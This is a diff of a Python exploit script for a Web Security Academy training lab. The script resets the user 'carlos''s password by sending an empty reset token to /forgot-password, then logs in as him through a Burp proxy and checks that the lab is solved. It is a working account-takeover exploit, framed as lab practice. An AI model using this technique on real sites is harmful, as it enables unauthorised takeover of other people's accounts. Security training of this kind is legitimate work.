@@ -1,54 +1,82 @@
-# Vulnerability in the reset new password function, after click link reset, just delete token
-
 import requests
 import sys
 import urllib3
+from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore
 
 # Burp Suite proxy
 proxies = {
     'http': 'http://127.0.0.1:8080',
-    'https': 'http://127.0.0.1:8080'    
+    'https': 'http://127.0.0.1:8080',  
 }
 
-def access_carlos_account(s, url):
-    # Reset Carlos's password
-    print("Resetting Carlos's password")
-    reset_password_url = url + '/forgot-password'
-    payload = {
-        'temp-forgot-password-token': '',
-        'username': 'carlos',
-        'new-password-1': '1234',
-        'new-password-2': '1234',
-    }
-    r = s.post(reset_password_url, data=payload)
-    print("Finished reset password")
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
+}
 
-    print("Login to Carlos's account")
-    login_url = url + '/login'
-    payload = {
-        'username': 'carlos',
-        'password': '1234',
-    }
-    r = s.post(login_url, data=payload)
 
-    if r.status_code == 200 and 'Log out' in r.text:
-        print("(+) Successfully bypassed 2FA verification")
+def get_csrf_token(s, url, path):
+    target_url = url + path
+    r = s.get(target_url, headers=headers)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    csrf = soup.find("input", {'name': 'csrf'})
+    return csrf.get('value', '') if csrf else '' # type: ignore
+
+def login_acc(s, url, path, csrf_path, username, password):
+    login_url = url + path
+    payload = {
+        "csrf": get_csrf_token(s, url, csrf_path),
+        "username": username,
+        "password": password
+    }
+    r = s.post(login_url, data=payload, allow_redirects=False)
+    if r.status_code == 302:
+        print(f'[+] Successful login {username} account')
     else:
-        print("(-) Exploit failed")
+        print(f'[-] Fail to login {username} account')
         sys.exit(-1)
 
+def reset_password(s, url, path, csrf_path, token, username, new_password):
+    target_url = url + path
+    payload = {
+        'csrf': get_csrf_token(s, url, csrf_path),
+        'temp-forgot-password-token': token,
+        'username': username,
+        'new-password-1': new_password,
+        'new-password-2': new_password
+    }
+    r = s.post(target_url, data=payload, allow_redirects=False)
+
+    if r.status_code == 302:
+        print(f'[+] Success change password to "{new_password}"')
+    else:
+        print('[-] Failed to change password')
+        sys.exit(-1)
+
+def check_solved_lab(s, url):
+    r = s.get(url)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("[+] Successful solved lab")
+        sys.exit(0)
+
 def main():
-    URL = 'https://0a380025048397e381017ae100a2000f.web-security-academy.net/'
-    if len(sys.argv) != 2 and URL == '':
+    if len(sys.argv) != 2:
         print("(+) Usage: %s <url>" % sys.argv[0])
         print("(+) Example: %s www.example.com" % sys.argv[0])
         sys.exit(-1)
 
     s = requests.Session()
-    url = URL if URL != '' else sys.argv[1]
-    access_carlos_account(s, url)
+    url = sys.argv[1].rstrip('/')
+
+    username = 'carlos'
+    new_password = 'test'
+
+    reset_password(s, url, '/forgot-password', '/forgot-password', '', username, new_password)
+    login_acc(s, url, '/login', '/login', username, new_password)
+
+    check_solved_lab(s, url)
 
 if __name__ == '__main__':
     main()
